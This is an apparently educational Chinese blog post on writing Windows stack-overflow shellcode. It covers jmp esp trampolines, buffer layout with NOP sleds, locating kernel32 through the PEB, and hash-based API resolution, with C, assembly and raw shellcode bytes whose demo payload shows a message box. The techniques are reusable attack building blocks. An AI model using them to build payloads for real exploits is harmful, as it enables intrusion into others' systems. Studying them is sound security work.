---
title: 开发shellcode
date: 2017-06-22 23:14:11
categories: 安全技术
tags: [stack, shellcode]
---

其实在《栈溢出原理与实践》那篇博客里，已经写了十分基础十分简单的shellcode。但是那种shellcode有一缺点：局限性！

### 1. shellcode概述

#### 1.1 shellcode和exploit

shellcode：往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到很多苛刻限制，故开发和调试的难度很高。

exploit：一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性输入，exploit的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode，与shellcode具有一定的通用性不同，exploit往往只是针对特定漏洞而言的。

Metasploit通过规范化exploit和shellcode之间的接口把漏洞利用的过程封装成易用的模块，大大减少了exploit开发过程中的重复工作，深刻体现了代码重用和模块化、结构化的思想:
（1）所有的 exploit都使用漏洞名称来命名，里面包含有这个漏洞的函数返回地址，所使用的跳转指令地址等关键信息。
（2）将常用的shellcode（例如，用于绑定端口反向链接、执行任意命令等）封装成一个个通用的模块，可以轻易地域任意漏洞的exploit进行结合。


#### 1.2 shellcode需要解决的问题

<b>由于运行在某个动态链接苦衷的函数在程序运行的过程中被动态加载，这时的栈会动态变化，也即调试器中抄出来的shellcode起始地址下次改变了。所以要编写出通用的shellcode，就需要找到一种途径让程序能够自动定位到shellcode的起始地址。</b>

### 2. 定位shellcode

#### 2.1 栈帧移位与jmp esp

动态定位的方法：
（1）用内存中任意一个jmp esp指令的地址覆盖函数返回地址，而不是原来手工查出的shellcode起始地址直接覆盖。
（2）函数返回后被重定向去执行内存中的这条jmp esp指令，而不是直接开始执行shellcode。
（3）由于esp在函数返回时仍指向栈区（函数返回地址之后），jmp esp指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。
（4）重新布置shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把shellcode恰好放在函数返回地址之后，这样jmp esp指令执行过后恰好跳进shellcode。

![使用“跳板”的溢出利用流程](/images/2017-06-22/shellcode.png)

#### 2.2 获取跳板地址

<font color=#f00>最简单，最实用的是使用msfpescan获取jmp esp的地址，而且速度更快！！！</font>

具体指令是: msfpescan -f -j esp PE文件

书中给出了另一种方法：

获取user32.dll内跳转指令地址最直观的方法就是编程搜索内存。其他程序也是如此！

另一种办法就是使用OllyDbg中的搜索命令指令，对程序命令进行搜索，最终可以找到！搜 JMP ESP 或者 CALL ESP

获取JMP ESP的代码
<pre><code>
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#define DLL_NAME "user32.dll"

void main()
{
    BYTE *ptr;
    int position, address;
    HINSTANCE handle;
    BOOL done_flag = FALSE;
    handle = LoadLibrary(DLL_NAME);
    if (!handle)
    {
        printf("  load dll erro !");
        exit(0);
    }

    ptr = (BYTE*)handle;

    for (position=0; !done_flag; position++)
    {
        try
        {
            //0xFFE4 is opcode of jmp esp
            if(ptr[position] == 0xFF && ptr[position+1] == 0xE4)
            {
                int address = (int)ptr + position;
                printf("OPCODE(JMP ESP) found at 0x%x\n", address);
                done_flag = TRUE;
            }
        }
        catch(...)
        {
            int address = (int)ptr + position;
            printf("END OF 0x%x\n", address);
            //done_flag = TRUE;
        }
    }
}

</code></pre>

上面的方法很具有局限性，因为将jmp esp重新更换为jmp eax时，上述代码就不可用，需要查询相应的opcode

#### 2.3 测试shellcode的可执行性

我们可以在vc6.0中编译相应的汇编代码，最好能够正常执行，能够执行了之后，通过OllyDbg获得相应的代码块，导出即可获得完整的代码。

<pre><code>
#include &lt;windows.h&gt;

void main()
{
    HINSTANCE LibHandle;
    char dllbuf[11] = "user32.dll";
    LibHandle = LoadLibrary(dllbuf);
    _asm{
        sub sp,0x440
        xor ebx,ebx
        push ebx //cut string
        push 0x74736577
        push 0x6C696166 //push failwest

        mov eax,esp //load address of failwest
        push ebx
        push eax
        push eax
        push ebx

        mov eax, 0x77E16544    //address should be reset in different OS, this is Win 2000 server
        call eax //call MessageboxA
        push ebx
        mov eax, 0x77E70E7D    //address of ExitProcess in Kernel32.dll
        call eax //call exit(0)
    }
}
</code></pre>

如果使用上述地址能够弹出默认窗口，那么代表上述所用的MessageBoxA和ExitProcess的地址都是正确的。

### 3. 缓冲区的组织

#### 3.1 缓冲区的组成

如果选用jmp esp作为定位shellcode的跳板，那么在函数返回后要根据缓冲区大小，所需shellcode长短等实际情况灵活布置缓冲区。送入缓冲区的数据分以下几种：
1. 填充物：可以是任意值，但是一般用nop指令对应的0x90来填充缓冲区，并把shellcode布置于其后。这样即使不能准确跳转到shellcode的开始，只要能跳进填充区，处理器最终也能顺序执行到shellcode。
2. 淹没返回地址的数据：可以是跳转指令的地址、shellcode的地址，甚至是一个近似shellcode的地址。
3. shellcode：可执行的机器代码

以下是几种缓冲区的组织方式：
![不同缓冲区组织方式](/images/2017-06-22/shellcode_method.png)
当缓冲区较大时，倾向于将shellcode布置到缓冲区中。有以下几个好处：
1. 合理利用缓冲区，使攻击串的总长度减小；对于远程攻击，有时所有数据必须包含在一个数据包中！
2. 对程序破坏小，比较稳定；溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。

#### 3.2 抬高栈顶保护shellcode

把shellcode布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧被弹出，这时缓冲区位于栈顶ESP之上的内存区域。在弹出栈帧时只是改变ESP寄存器中的值，逻辑上，ESP以上的内存空间的数据已经作废；物理上，这些数据并没有被销毁。如果shellcode中没有压栈指令向栈中写入数据还没有太大影响；但如果使用push指令在栈中暂存数据，压栈数据很可能会破坏shellcode自身。

当缓冲区相对shellcode较大时，把shellcode布置在缓冲区的“前端”（内存低址方向），这时shellcode离栈顶较远 ，几次压栈可能只会破坏到一些填充nop；但是，如果缓冲区已经被shellcode占满，则shellcode离栈顶比较近，这时的情况就必要危险。

为此，为了提高较强的通用性，通常会在shellcode中一开始就大范围抬高栈顶，把shellcode藏在栈内。

#### 3.3 使用其他跳转指令

使用jmp esp做“跳板”的方法是最简单，也是最常用的定位shellcode的方法。在实际的漏洞利用过程中，应当注意观察漏洞函数返回时所有寄存器的值。往往除了ESP之外，EAX、EBX、ESI等寄存器也会指向栈顶附近，故在选择跳转指令地址时也可以灵活一些，除了jmp esp之外，mov eax、esp和jmp eax等指令序列也可以完成进入栈区的功能。

<b><center>常用跳转指令与机器码的对应关系</center></b>

|机器码（十六进制）|对应的跳转指令|机器码（十六进制）|对应的跳转指令|
|--|--|--|--|
|FF EO|JMP EAX|FF D0|CALL EAX|
|FF E1|JMP ECX|FF D1|CALL ECX|
|FF E2|JMP EDX|FF D2|CALL EDX|
|FF E3|JMP EBX|FF D3|CALL EBX|
|FF E4|JMP ESP|FF D4|CALL ESP|
|FF E5|JMP EBP|FF D5|CALL EBP|
|FF E6|JMP ESI|FF D6|CALL ESI|
|FF E7|JMP EDI|FF D7|CALL EDI|

#### 3.4 不使用跳转指令

个别苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位shellcode，而使用shellcode的静态地址来覆盖又不够准确，这时我们可以做一个折中，如果过能够淹没大片的内存区域，可以将shellcode布置在一大段nop之后。这时定位shellcode时，只要能跳进这一大片nop中，shellcode就可以得到执行。

#### 3.5 函数返回地址移位

一些情况下，返回地址距离缓冲区的偏移量是不确定的，这时我们也可以采取前面介绍过的方法来提高exploit的成功率。

如果函数返回地址的偏移按双字（DWORD）不定，可以用一片连续的跳转指令来覆盖函数返回地址，只要其中有一个能够成功覆盖，shellcode就能得以执行。

![shellcode](/images/2017-06-22/shellcode2.png)

<font color=#f00>函数返回地址距离我们输入的字符串的偏移在不同的计算机上就可能出现按照字节错位</font>

![shellcode移位](/images/2017-06-22/shellcode_shift.png)

### 4. 开发通用的shellcode

#### 4.1 定位API的原理

所有win32程序都会加载ntdll.dll和kernel32.dll这两个最基础的动态链接库。如果想要在win32平台上定位kernel32.dll中的API地址，可采用如下方法：
（1）首先通过段选择字FS在内存中找到当前的线程环境块TEB
（2）线程环境块偏移位置为0x30的地方存放着指向进程环境块PEB的指针
（3）进程环境块中偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针。其中，存放着已经被进程装载的动态链接库的信息。
（4）PEB_LDR_DATA结构体偏移位置为0x1C的地方存放着指向模块初始化链表的头指针InInitializationOrderModuleList
（5）模块初始化链表InInitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点为kernel32.dll
（6）找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址
（7）从kernel32.dll的加载基址算起，偏移0x3C的地方就是PE头
（8）PE头偏移0x78的地方存放着指向函数导出表的指针
（9）至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。
* 导出表偏移0x1C处的指针指向存储导出函数偏移地址(RVA)的列表
* 导出表偏移0x20处的指针指向存储导出函数函数名的列表
* 函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需函数是第几个，然后在地址列表汇总找到对应的RVA
* 获得RVA后，再加上前边已经得到的动态链接库的加载地址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是我们最终在shellcode中调用时需要的地址。

![在shellcode中动态定位API的原理](/images/2017-06-22/shellcode_api.jpg)

<font color=#f00>需要说明的是：上述图中所表现的ntdll.dll过了之后就是kernel32.dll并不完全正确，准确的说这只在window xp及其以前是这样的；但是从win7开始，这两者之间加入了kernelbase.dll</font>

#### 4.2 shellcode的加载与测试

这一章类似于2.3节的内容，但是有些许的改变，可以与其对照进行查看.

<pre><code>
#include &lt;windows.h&gt;

char shellcode[] =
"\x66\x81\xEC\x40\x04"		// SUB SP, 440
"\x33\xDB"					// XOR EBX, EBX
"\x53"						// PUSH EBX
"\x68\x77\x65\x73\x74"		// PUSH 74736577
"\x68\x66\x61\x69\x6C"		// PUSH 6C696166
"\x8B\xC4"					// MOV EAX, ESP
"\x53"						// PUSH EBX
"\x50"						// PUSH EAX
"\x50"						// PUSH EAX
"\x53"						// PUSH EBX
"\xB8\x44\x65\xE1\x77"		// MOV EAX, user32.MessageBoxA
"\xFF\xD0"					// CALL EAX
"\x53"						// PUSH EBX
"\xB8\x7D\x0E\xE7\x77"		// MOV EAX, kernel32.ExitProcess
"\xFF\xD0";					// CALL EAX

void main()
{
	HINSTANCE LibHandle;
    char dllbuf[11] = "user32.dll";
    LibHandle = LoadLibrary(dllbuf);
	__asm
	{
		lea eax, shellcode
		push eax
		ret
	}
}
</code></pre>

#### 4.3 动态定位API地址的shellcode

首先需要知道的是：
MessageBoxA： user32.dll
ExitProcess: kernel32.dll
LoadLibraryA: kernel32.dll

由于shellcode最终是要放进缓冲区的，为了让shellcode更加通用，能被大多数缓冲区容纳，我们总是希望shellcode尽可能短。因此一般不会用“MessageBoxA”这么长的字符串进行直接比较。
通常会对所用的API函数进行hash运算，搜索导出表时对当前遇到的函数名同样进行hash。对比之后，判断是否是需要的API。

<pre><code>
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

DWORD GetHash(char  *fun_name)
{
	DWORD digest=0;
	while(*fun_name)
	{
		digest = ((digest<<25)|(digest>>7));	// 循环右移7位
		digest += *fun_name;					// 累加
		fun_name++;
	}
	return digest;
}

void main()
{
	DWORD hash;
	hash = GetHash("AddAtomA");
	printf("result of hash is %.8x\n", hash);
}
</code></pre>

通过该hash算法获得API函数对应的摘要

|API函数|hash值|
|--|--|
|MessageBoxA|0x1e380a6a|
|ExitProcess|0x4fd18963|
|LoadLibraryA|0x0c917432|

在将hash压入栈中之前，注意先将增量标志DF清零。因为当shellcode是利用异常处理机制而植入的时候，往往会产生标志位的变化，使shellcode中字符串处理方向发生变化而产生错误(如指令LODSD)。

![定位API的流程图](/images/2017-06-22/address_api.jpg)

<pre><code>
void main()
{
	__asm{
		CLD					;clear flag DF
		;store hash
		push 0x1e380a6a		;hash of MessageBoxA
		push 0x4fd18963		;hash of ExitProcess
		push 0x0c917432		;hash of LoadLibraryA
		mov esi, esp		;esi = addr of first function hash
		lea edi,[esi-0xc]	;edi = addr of start writing function

		;make some stack space
		xor ebx,ebx
		mov bh, 0x04
		sub esp, ebx

		;push a pointer to "user32" onto stack
		mov bx, 0x3233		;32
		push ebx
		push 0x72657375		;user
		push esp
		xor edx,edx
		
		;find base addr of kernel32.dll
		mov ebx, fs:[edx+0x30]		;ebx = address of PEB
		mov ecx, [ebx+0x0c]			;ecx = pointer to loader data
		mov ecx, [ecx+0x1c]			;ecx = first entry in initialization order list
		mov ecx, [ecx]				;ecx = second entry in list
		;mov ecx, [ecx]				;ebp = base address of kernelbase.dll in after win7
        							;ebp = base address of kernel32.dll in before winxp
									;some people may think it is the addr of kernel32.dll
									;but it was wrong
		mov ebp, [ecx+0x8]			;under the test, we know it is the addr of kernel32.dll

	find_lib_functions:
		//lodsd						;load next hash into al and increment esi
		mov eax, [esi]
		add esi, 0x4
		cmp eax, 0x1e380a6a			;hash of MessageBoxA trigger
									;LoadLibrary("user32")
		jne find_functions
		xchg eax,ebp				;save current hash
		call [edi - 0x8]			;LoadLibraryA
		xchg eax,ebp				;restore current hash, and update ebp with base address of user32.dll

	find_functions:
		pushad						;preserve registers
		mov eax, [ebp + 0x3c]		;eax = start of PE header
		mov ecx, [ebp + eax + 0x78]	;ecx = relative offset of export table
		add ecx, ebp				;ecx = absolute addr of export table
		mov ebx, [ecx + 0x20]		;ebx = relative offset of names table
		add ebx, ebp				;ebx = absolute addr of names table
		xor edi, edi				;edi will count through the functions

	next_function_loop:
		inc edi						;increment function counter
		mov esi, [ebx + edi * 4]	;esi = relative offset of current function name
		add esi, ebp				;esi = absolute addr of current function  name
		cdq							;dl will hold hash(we know eax is small)

	hash_loop:
		movsx eax, byte ptr[esi]
		cmp al, ah
		jz compare_hash
		ror edx, 7
		add edx, eax
		inc esi
		jmp hash_loop

	compare_hash:
		cmp edx, [esp + 0x1c]	;compare to the requested hash(saved on stack from pushad)
		jnz next_function_loop
		mov ebx, [ecx + 0x24]	;ebx = relative offset of ordinals table
		add ebx, ebp			;ebx = absolute addr of ordinals table
		mov di, [ebx + 2*edi]	;di = ordinal number of matched function
		mov ebx, [ecx + 0x1c]	;ebx = relative offset of address table
		add ebx, ebp			;ebx = absolute addr of address table
		add ebp, [ebx + 4*edi]	;add to ebp(base addr of module) the relative offset of matched function
		xchg eax, ebp			;move func addr into eax
		pop edi					;edi is last onto stack in pushad
		stosd					;write function addr to [edi] and increment edi
		push edi
		popad					;restore registers
								;loop until we reach end of the last hash
		cmp eax, 0x1e380a6a
		jne find_lib_functions

	function_call:
		xor ebx, ebx
		push ebx				;cut string
		push 0x74736577
		push 0x6C696166			;push failwest
		mov eax, esp			;load address of failwest
		push ebx
		push eax
		push eax
		push ebx
		call [edi - 0x4]		;call MessageBoxA
		push ebx
		call [edi - 0x8]		;call ExitProcess
		nop
		nop
		nop
		nop
	}
}
</code></pre>

其对应的机器码为：
<pre><code>
char shellcode2[] = 
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
	"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
	"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
	"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
	"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
	"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
	"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
	"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
	"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
	"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
	"\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

void main()
{
	__asm
	{
		lea eax, shellcode2
		push eax
		ret
	}
}
</code></pre>